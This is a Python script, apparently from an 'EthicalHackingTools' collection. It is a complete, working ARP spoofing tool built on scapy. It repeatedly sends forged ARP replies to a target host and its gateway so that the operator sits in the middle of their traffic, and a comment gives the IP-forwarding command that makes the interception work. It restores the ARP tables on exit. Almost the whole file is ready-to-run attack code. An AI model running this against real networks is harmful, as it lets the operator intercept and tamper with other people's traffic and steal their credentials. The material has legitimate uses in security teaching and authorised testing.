#!/usr/bin/env pyhton

import scapy.all as scapy
import time
import argparse
import re
import sys

# To enable IP forwarding for becoming MiM: echo 1 > /proc/sys/net/ipv4/ip_forward


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    # Create an ethernet frame with broadcast MAC address as destination
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request

    # Send and receive function
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    # return MAC address of given IP
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)

    # send ARP response to the victim with fake source IP
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)

    # sends packet 4 times
    scapy.send(packet, count=4, verbose=False)


# TARGET_IP = "192.168.64.135"
# GATEWAY_IP = "192.168.64.2"


def get_arguments():
    parser = argparse.ArgumentParser(
        prog='arp_spoof',
        description='Starts an ARP spoofing attack, allowing the attacker to become Man-In-The-Middle.',
        epilog='Part of EthicalHackingTools.'
    )
    parser.add_argument(dest="target", help="Target IP")
    parser.add_argument(dest="gateway", help="Gateway IP")
    options = parser.parse_args()

    if not options.target:
        parser.error("[-] Please specify a target IP address, use --help for more info.")
    elif not re.match(r"^\d+\.\d+\.\d+\.\d+(/\d{1,2})?$", str(options.target)):
        parser.error("[-] Please specify a valid target IP address, use --help for more info.")

    if not options.gateway:
        parser.error("[-] Please specify a gateway IP address, you can find it using 'ifconfig', "
                     "or use --help for more info.")
    elif not re.match(r"^\d+\.\d+\.\d+\.\d+(/\d{1,2})?$", str(options.gateway)):
        parser.error("[-] Please specify a valid gateway IP address, use --help for more info.")

    return options


sent_packets_count = 0
arguments = get_arguments()
try:
    while True:
        try:
            spoof(arguments.target, arguments.gateway)        # tells router I am the target
        except IndexError:
            print("[-] Target IP address was not found on this network")
            sys.exit(-1)
        try:
            spoof(arguments.gateway, arguments.target)        # tells target that I am the router (gateway)
        except IndexError:
            print("[-] Gateway IP address was not found on this network")
            sys.exit(-1)
        sent_packets_count = sent_packets_count + 2

        # comma used to print everything on the same line, \r always prints from start of line,
        # only on Python 2.7!!!
        # print("\r[+] Packets sent: " + str(sent_packets_count)),
        # sys.stdout.flush()

        # Python 3 compatible
        print("\r[+] Packets sent: " + str(sent_packets_count), end="")

        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Resetting ARP tables...")
    restore(arguments.target, arguments.gateway)
    restore(arguments.gateway, arguments.target)
    print("[+] Successfully restored. Quitting...")
